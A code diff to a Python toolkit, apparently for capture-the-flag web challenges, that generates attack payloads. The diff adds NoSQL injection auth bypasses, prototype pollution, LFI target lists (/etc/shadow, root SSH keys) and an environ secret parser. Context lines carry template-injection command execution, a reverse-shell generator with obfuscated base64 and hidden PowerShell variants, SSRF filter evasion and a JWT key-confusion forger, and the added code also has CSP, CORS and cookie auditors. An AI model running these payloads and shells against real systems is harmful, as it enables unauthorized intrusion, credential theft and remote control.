@@ -161,7 +161,7 @@ def ssti_payloads(engine: str = "jinja2", command: str = "id") -> str:
     """
     eng = engine.lower().strip()
     c = command.replace("'", "\\'")
-    
+
     payloads = {
         "jinja2": [
             f"{{{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{c}').read() }}}}",
@@ -203,12 +203,12 @@ def ssti_payloads(engine: str = "jinja2", command: str = "id") -> str:
             f"<%= system('{c}') %>",
         ],
     }
-    
+
     selected = payloads.get(eng)
     if not selected:
         available = ", ".join(payloads.keys())
         return f"Unknown engine {engine!r}. Available: {available}."
-        
+
     return f"SSTI Payloads for {engine.upper()} (Command: {command!r}):\n\n" + "\n\n".join(selected)
 
 
@@ -221,7 +221,7 @@ def revshell_generator(ip: str, port: int, shell_type: str = "bash", encoding: s
     :param encoding: encoding
     """
     st = shell_type.lower().strip()
-    
+
     shells = {
         "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
         "bash_udp": f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
@@ -234,10 +234,10 @@ def revshell_generator(ip: str, port: int, shell_type: str = "bash", encoding: s
         "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
         "node": f"require('child_process').exec('nc -e /bin/sh {ip} {port}')",
     }
-    
+
     raw = shells.get(st, shells["bash"])
     enc = encoding.lower().strip()
-    
+
     if enc == "base64":
         b64_cmd = base64.b64encode(raw.encode()).decode()
         return f"echo {b64_cmd} | base64 -d | bash"
@@ -249,7 +249,7 @@ def revshell_generator(ip: str, port: int, shell_type: str = "bash", encoding: s
         ps_bytes = raw.encode("utf-16le")
         b64_ps = base64.b64encode(ps_bytes).decode()
         return f"powershell -nop -w hidden -enc {b64_ps}"
-        
+
     return f"Reverse Shell [{st}] ({ip}:{port}):\n{raw}"
 
 
@@ -260,7 +260,7 @@ def php_filter_chain(resource: str = "flag.php", action: str = "base64") -> str:
     :param action: action to perform
     """
     act = action.lower().strip()
-    
+
     if act == "base64":
         return f"php://filter/convert.base64-encode/resource={resource}"
     elif act == "rot13":
@@ -286,7 +286,7 @@ def php_filter_chain(resource: str = "flag.php", action: str = "base64") -> str:
             "SHA256:\n"
             "  'TyNOQIPG52072...' -> 0e00000000000000000000000000000000000000000000000000000000000000"
         )
-        
+
     return f"php://filter/convert.base64-encode/resource={resource}"
 
 
@@ -298,20 +298,20 @@ def ssrf_obfuscator(ip_or_host: str = "127.0.0.1", port: int = 80) -> str:
     """
     import socket
     import struct
-    
+
     try:
         ip = socket.gethostbyname(ip_or_host)
     except Exception:
         ip = "127.0.0.1"
-        
+
     parts = [int(p) for p in ip.split(".")]
     dec = int.from_bytes(bytes(parts), "big")
     hex_single = f"0x{dec:08x}"
     hex_parts = ".".join(f"0x{p:02x}" for p in parts)
     octal_parts = ".".join(f"0{p:03o}" for p in parts)
-    
+
     port_str = f":{port}" if port not in (80, 443) else ""
-    
+
     return (
         f"SSRF IP Obfuscation for {ip_or_host} ({ip}):\n"
         f"--------------------------------------------------\n"
@@ -341,20 +341,20 @@ def jwt_key_confusion(token: str, rsa_public_key_pem: str, modify_payload_json: 
     import hmac
     import hashlib
     import os
-    
+
     parts = token.strip().split(".")
     if len(parts) != 3:
         return "Invalid JWT token structure."
-        
+
     try:
         header = json.loads(_unb64url(parts[0]))
         payload = json.loads(_unb64url(parts[1]))
     except Exception as ex:
         return f"Failed to parse JWT: {ex}"
-        
+
     # Switch alg to HS256
     header["alg"] = "HS256"
-    
+
     # Update payload
     if modify_payload_json:
         try:
@@ -362,19 +362,19 @@ def jwt_key_confusion(token: str, rsa_public_key_pem: str, modify_payload_json: 
             payload.update(extra)
         except Exception as ex:
             return f"Invalid JSON in modify_payload_json: {ex}"
-            
+
     h_b64 = _b64url(json.dumps(header, separators=(",", ":")).encode())
     p_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
-    
+
     # Secret is the raw bytes of the public key
     if os.path.exists(rsa_public_key_pem.strip()):
         secret_bytes = open(rsa_public_key_pem.strip(), "rb").read()
     else:
         secret_bytes = rsa_public_key_pem.strip().encode()
-        
+
     sig = hmac.new(secret_bytes, f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
     forged = f"{h_b64}.{p_b64}.{_b64url(sig)}"
-    
+
     return (f"🏆 Forged HS256 Token (Key Confusion CVE-2015-9235):\n"
             f"{forged}\n\n"
             f"Header:\n{json.dumps(header, indent=2)}\n"
@@ -741,3 +741,332 @@ def flask_session(session_cookie: str, secret: str = "", action: str = "decode",
     if parsed is not None and "user" in parsed:
         lines.append(f"user claim: {parsed['user']}")
     return "\n".join(lines)
+
+
+@tool(category="web")
+def nosql_payloads(kind: str = "auth_bypass", username: str = "admin") -> str:
+    """Generate NoSQL injection payloads for MongoDB/Express/Node applications (auth bypass, regex extraction, where injection).
+
+    :param kind: Type of injection: 'auth_bypass', 'regex_extract', 'where_eval', 'json_body'
+    :param username: Target username to test (default: 'admin')
+    """
+    payloads = {
+        "auth_bypass": [
+            f'{{"username": "{username}", "password": {{"$ne": ""}}}}',
+            f'{{"username": "{username}", "password": {{"$gt": ""}}}}',
+            f'{{"username": {{"$ne": null}}, "password": {{"$ne": null}}}}',
+            f'{{"username": {{"$in": ["admin", "root", "administrator"]}}, "password": {{"$ne": 1}}}}',
+            f'{{"$or": [{{"username": "{username}"}}, {{"username": "root"}}]}}',
+            f'{{"username": "{username}", "password": {{"$exists": true}}}}',
+        ],
+        "regex_extract": [
+            f'{{"username": "{username}", "password": {{"$regex": "^a.*"}}}}',
+            f'{{"username": "{username}", "password": {{"$regex": "^flag{{.*"}}}}',
+            f'{{"username": "{username}", "password": {{"$regex": "^[a-f0-9]{{32}}$"}}}}',
+            f'username={username}&password[$regex]=^flag.*',
+            f'username[$regex]=^adm.*&password[$ne]=1',
+        ],
+        "where_eval": [
+            f'{{"$where": "this.username == \'{username}\' || \'1\'==\'1\'"}}',
+            f'{{"$where": "sleep(5000)"}}',
+            f'\' || 1==1 //',
+            f'\' || this.password.match(/^flag.*/) //',
+            f'0; return true;',
+        ],
+        "json_body": [
+            f'{{"user": "{username}", "pass": {{"$ne": ""}}}}',
+            f'{{"token": {{"$gt": ""}}}}',
+            f'{{"reset_token": {{"$regex": "^.*"}}}}',
+            f'{{"role": {{"$in": ["admin", "superadmin"]}}}}',
+        ]
+    }
+
+    target_kind = kind.lower().strip()
+    results = payloads.get(target_kind, payloads["auth_bypass"])
+
+    return (
+        f"NoSQL Injection Payloads ({target_kind}):\n" +
+        "\n".join(f"  [{i+1}] {p}" for i, p in enumerate(results)) +
+        "\n\nNote: For URL-encoded parameters, use format: username=admin&password[$ne]=x"
+    )
+
+
+@tool(category="web")
+def prototype_pollution_payloads(target_prop: str = "isAdmin", target_val: str = "true") -> str:
+    """Generate prototype pollution payloads for Node.js / JavaScript objects (__proto__, constructor.prototype).
+
+    :param target_prop: Target property name to inject on Object.prototype (e.g. 'isAdmin', 'role', 'status')
+    :param target_val: Target value to set (e.g. 'true', 'admin', '1')
+    """
+    json_payloads = [
+        f'{{"__proto__": {{"{target_prop}": {target_val}}}}}',
+        f'{{"constructor": {{"prototype": {{"{target_prop}": {target_val}}}}}}}',
+        f'{{"__proto__": {{"__proto__": {{"{target_prop}": {target_val}}}}}}}',
+    ]
+
+    url_payloads = [
+        f"__proto__[{target_prop}]={target_val}",
+        f"__proto__.{target_prop}={target_val}",
+        f"constructor[prototype][{target_prop}]={target_val}",
+        f"constructor.prototype.{target_prop}={target_val}",
+    ]
+
+    return (
+        f"Prototype Pollution Payloads for Property '{target_prop}' = '{target_val}':\n\n"
+        f"JSON Body Payloads:\n" +
+        "\n".join(f"  {p}" for p in json_payloads) +
+        "\n\nQuery / Form-Urlencoded Payloads:\n" +
+        "\n".join(f"  {p}" for p in url_payloads) +
+        "\n\nTakeaway: Prototype pollution allows tampering with default object attributes (auth, template engine flags, sandbox bypasses)."
+    )
+
+
+@tool(category="web")
+def linux_proc_environ_parse(proc_environ_data: str) -> str:
+    """Parse null-byte delimited /proc/self/environ or /proc/<PID>/environ leaked data into a structured environment table.
+
+    :param proc_environ_data: Raw leaked string or file path from /proc/self/environ
+    """
+    import os
+    if os.path.exists(proc_environ_data):
+        raw = open(proc_environ_data, "rb").read()
+        text = raw.decode("latin-1", errors="replace")
+    else:
+        text = proc_environ_data
+
+    entries = [e.strip() for e in text.split("\x00") if e.strip()]
+    if not entries and "\n" in text:
+        entries = [e.strip() for e in text.splitlines() if e.strip()]
+
+    if not entries:
+        return "No environment variables found in data."
+
+    lines = [f"Leaked Linux Environment Variables ({len(entries)} items):"]
+    for e in entries:
+        if "=" in e:
+            k, v = e.split("=", 1)
+            is_secret = any(s in k.upper() for s in ("FLAG", "KEY", "SECRET", "TOKEN", "PASS", "AUTH", "CRED"))
+            flag_marker = " 🚩 [CRITICAL]" if is_secret else ""
+            lines.append(f"  {k:<24} = {v}{flag_marker}")
+        else:
+            lines.append(f"  {e}")
+
+    return "\n".join(lines)
+
+
+@tool(category="web")
+def linux_lfi_filter_chains(target_file: str = "/etc/passwd", encoding: str = "base64") -> str:
+    """Generate Linux LFI wrappers (PHP filters, procfs, log poison endpoints, data schemes) for arbitrary file read.
+
+    :param target_file: Path to read (e.g. '/etc/passwd', 'index.php', 'flag.php', '/proc/self/cmdline')
+    :param encoding: Filter encoding mode ('base64', 'rot13', 'iconv', 'string')
+    """
+    clean_target = target_file.strip()
+
+    php_filters = [
+        f"php://filter/convert.base64-encode/resource={clean_target}",
+        f"php://filter/read=convert.base64-encode/resource={clean_target}",
+        f"php://filter/string.rot13/resource={clean_target}",
+        f"php://filter/convert.iconv.utf-8.utf-16/resource={clean_target}",
+        f"php://filter/zlib.deflate/convert.base64-encode/resource={clean_target}",
+    ]
+
+    procfs_targets = [
+        "/proc/self/environ",
+        "/proc/self/cmdline",
+        "/proc/self/fd/0",
+        "/proc/self/fd/1",
+        "/proc/self/fd/2",
+        "/proc/self/cwd/index.php",
+        "/proc/self/cwd/config.php",
+        "/proc/self/cwd/flag.txt",
+        "/proc/version",
+        "/proc/net/tcp",
+    ]
+
+    linux_standard_files = [
+        "/etc/passwd",
+        "/etc/hosts",
+        "/etc/resolv.conf",
+        "/etc/shadow",
+        "/etc/crontab",
+        "/var/log/apache2/access.log",
+        "/var/log/nginx/access.log",
+        "/var/log/auth.log",
+        "/root/.bash_history",
+        "/home/*/.bash_history",
+        "/root/.ssh/id_rsa",
+        "/root/.ssh/authorized_keys",
+    ]
+
+    return (
+        f"=== Linux LFI Payload Generation for '{clean_target}' ===\n\n"
+        f"PHP Filter Wrappers:\n" +
+        "\n".join(f"  • {p}" for p in php_filters) +
+        f"\n\nProcfs File Descriptors & State (LFI):\n" +
+        "\n".join(f"  • {p}" for p in procfs_targets) +
+        f"\n\nHigh-Value Linux Target Files:\n" +
+        "\n".join(f"  • {p}" for p in linux_standard_files[:8])
+    )
+
+
+@tool(category="web")
+def csp_header_analyzer(csp_header: str) -> str:
+    """Analyze Content-Security-Policy (CSP) directives, identifying XSS bypasses, unsafe-inline, and misconfigurations.
+
+    :param csp_header: Raw Content-Security-Policy header string
+    """
+    clean = csp_header.strip()
+    directives = [d.strip() for d in clean.split(";") if d.strip()]
+
+    parsed = {}
+    for d in directives:
+        parts = d.split()
+        if parts:
+            name = parts[0].lower()
+            vals = parts[1:]
+            parsed[name] = vals
+
+    findings = []
+
+    # Check script-src or default-src
+    script_sources = parsed.get("script-src", parsed.get("default-src", []))
+    if not script_sources:
+        findings.append("⚠️ HIGH: No 'script-src' or 'default-src' directive defined (XSS unrestricted)!")
+    else:
+        if "'unsafe-inline'" in script_sources:
+            findings.append("⚠️ HIGH: 'unsafe-inline' allowed in script-src (inline <script> and event handlers allowed)!")
+        if "'unsafe-eval'" in script_sources:
+            findings.append("⚠️ MEDIUM: 'unsafe-eval' allowed (eval(), setTimeout strings allowed)!")
+        if "*" in script_sources or "https:" in script_sources or "http:" in script_sources:
+            findings.append("⚠️ HIGH: Wildcard host '*' or broad scheme ('https:') allowed in script-src!")
+        if "data:" in script_sources:
+            findings.append("⚠️ HIGH: 'data:' scheme allowed in script-src (data:text/javascript injection possible)!")
+
+    if "object-src" not in parsed and "default-src" not in parsed:
+        findings.append("⚠️ MEDIUM: Missing 'object-src' (legacy Flash / plugin injection possible)!")
+    elif "'none'" not in parsed.get("object-src", []):
+        findings.append("ℹ️ INFO: 'object-src' is not set to 'none'.")
+
+    if "base-uri" not in parsed:
+        findings.append("⚠️ LOW: Missing 'base-uri' directive (attacker can inject <base href=> to hijack relative scripts)!")
+
+    lines = [f"=== Content-Security-Policy Audit ({len(parsed)} directives) ==="]
+    if findings:
+        lines.append("\nSecurity Hazards & Bypass Vectors:")
+        lines.extend(f"  {f}" for f in findings)
+    else:
+        lines.append("\n✅ Strong CSP: No standard high-severity bypasses found.")
+
+    lines.append("\nParsed Directives:")
+    for k, v in parsed.items():
+        lines.append(f"  • {k:<18}: {' '.join(v)}")
+
+    return "\n".join(lines)
+
+
+@tool(category="web")
+def cors_header_audit(origin: str, allow_origin: str = "", allow_creds: str = "true") -> str:
+    """Audit Cross-Origin Resource Sharing (CORS) headers for origin reflection and credential theft vulnerabilities.
+
+    :param origin: Requested Origin (e.g. 'https://evil.com' or 'null')
+    :param allow_origin: Access-Control-Allow-Origin response value
+    :param allow_creds: Access-Control-Allow-Credentials response value ('true' or 'false')
+    """
+    o = origin.strip()
+    ao = allow_origin.strip()
+    ac = allow_creds.strip().lower() == "true"
+
+    findings = []
+    if ao == "*":
+        if ac:
+            findings.append("⚠️ INVALID CONFIG: Browsers block Access-Control-Allow-Credentials: true with wildcard '*' origin.")
+        else:
+            findings.append("ℹ️ PUBLIC API: Wildcard '*' allowed without credentials (standard for public endpoints).")
+    elif ao == o:
+        if ac:
+            findings.append("🚨 CRITICAL: Arbitrary Origin Reflection with Credentials! (Full authenticated CSRF/data exfiltration via CORS).")
+        else:
+            findings.append("⚠️ MEDIUM: Arbitrary Origin Reflection without credentials.")
+    elif ao == "null":
+        if ac:
+            findings.append("🚨 CRITICAL: 'null' origin trusted with credentials! (Sandboxed iframe can steal authenticated data).")
+
+    lines = [
+        f"=== CORS Configuration Audit ===",
+        f"  Origin Sent         : {o}",
+        f"  Allow-Origin Ret    : {ao or '(None)'}",
+        f"  Allow-Credentials   : {allow_creds}",
+    ]
+    if findings:
+        lines.append("\nFindings:")
+        lines.extend(f"  {f}" for f in findings)
+    return "\n".join(lines)
+
+
+@tool(category="web")
+def cookie_flags_audit(cookie_header: str) -> str:
+    """Audit Set-Cookie HTTP response headers for missing security flags (HttpOnly, Secure, SameSite).
+
+    :param cookie_header: Raw Set-Cookie header string (e.g. 'session=abc1234; Path=/; HttpOnly')
+    """
+    clean = cookie_header.strip()
+    parts = [p.strip() for p in clean.split(";") if p.strip()]
+    if not parts:
+        return "ERROR: Empty cookie header."
+
+    c_name_val = parts[0]
+    flags = [p.lower() for p in parts[1:]]
+
+    has_httponly = any(f == "httponly" for f in flags)
+    has_secure = any(f == "secure" for f in flags)
+    samesite_flag = next((f for f in flags if f.startswith("samesite")), None)
+
+    findings = []
+    if not has_httponly:
+        findings.append("⚠️ HIGH: Missing 'HttpOnly' flag (Cookie accessible via JavaScript document.cookie / XSS session theft).")
+    if not has_secure:
+        findings.append("⚠️ MEDIUM: Missing 'Secure' flag (Cookie transmitted over plaintext HTTP).")
+    if not samesite_flag:
+        findings.append("⚠️ LOW: Missing 'SameSite' attribute (Default behavior varies, susceptible to CSRF).")
+    elif "samesite=none" in samesite_flag and not has_secure:
+        findings.append("⚠️ HIGH: 'SameSite=None' must be accompanied by 'Secure' flag!")
+
+    lines = [
+        f"=== Cookie Security Flags Audit for `{c_name_val}` ===",
+        f"  HttpOnly : {'✅ Present' if has_httponly else '❌ MISSING'}",
+        f"  Secure   : {'✅ Present' if has_secure else '❌ MISSING'}",
+        f"  SameSite : {samesite_flag.upper() if samesite_flag else '❌ MISSING'}",
+    ]
+    if findings:
+        lines.append("\nSecurity Recommendations:")
+        lines.extend(f"  {f}" for f in findings)
+    else:
+        lines.append("\n✅ Cookie is properly hardened with all recommended security flags.")
+
+    return "\n".join(lines)
+
+
+@tool(category="web")
+def url_deobfuscator(url: str) -> str:
+    """Peel multiple layers of URL percent-encoding, hex characters, and unicode normalization from a URL.
+
+    :param url: Obfuscated or multiply-encoded URL string
+    """
+    import urllib.parse
+    current = url.strip()
+    history = [current]
+
+    for step in range(1, 6):
+        unquoted = urllib.parse.unquote(current)
+        if unquoted == current:
+            break
+        current = unquoted
+        history.append(f"Pass {step}: {current}")
+
+    return (
+        f"=== URL Deobfuscation Result ===\n"
+        f"Final Decoded URL:\n{current}\n\n"
+        f"Transformation History:\n" +
+        "\n".join(f"  {h}" for h in history)
+    )
